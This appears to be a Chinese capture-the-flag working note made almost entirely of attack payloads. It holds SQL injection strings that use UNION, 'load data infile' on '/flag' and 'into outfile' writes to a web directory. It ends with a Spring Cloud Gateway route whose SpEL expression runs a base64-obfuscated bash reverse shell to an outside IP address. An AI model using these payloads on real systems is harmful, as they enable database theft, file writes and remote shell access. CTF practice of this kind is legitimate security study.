过滤了：*
没过滤：空格、where、=、union

可以看dump日志，如何在dump中输出敏感文件内容？

```
?db=ctf&table_2_query=flag1 where 1=1 -- fghj
?db=ctf&table_2_query=flag1 union select * from ctf.flag1
?db=ctf&table_2_query=flag1 union load data infile "/flag" into table ctf.flag1
```

```
// flag 1-6，56有提示
?db=ctf&table_2_query=flag5
```

```
?db=ctf&table_2_query=flag1 union select '123' into outfile '/var/www/html/abc.txt'
?db=ctf&table_2_query=?db=ctf&table_2_query=flag1 and 1=2 union select '123' into outfile '/abc.txt'
?db=ctf&table_2_query=?db=ctf&table_2_query=flag1 and 1=2
```
要不也命令注入试试看？弹个shell
https://www.jiyik.com/tm/xwzj/network_1520.html
https://blog.51cto.com/u_15878568/5859714


```
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "exam",
                        "order": 0,
                        "uri": "lb://backendservice",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY4LjE2Ny4zOS81MDAwIDA+JjE}|{base64,-d}|{bash,-i}\").getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}

```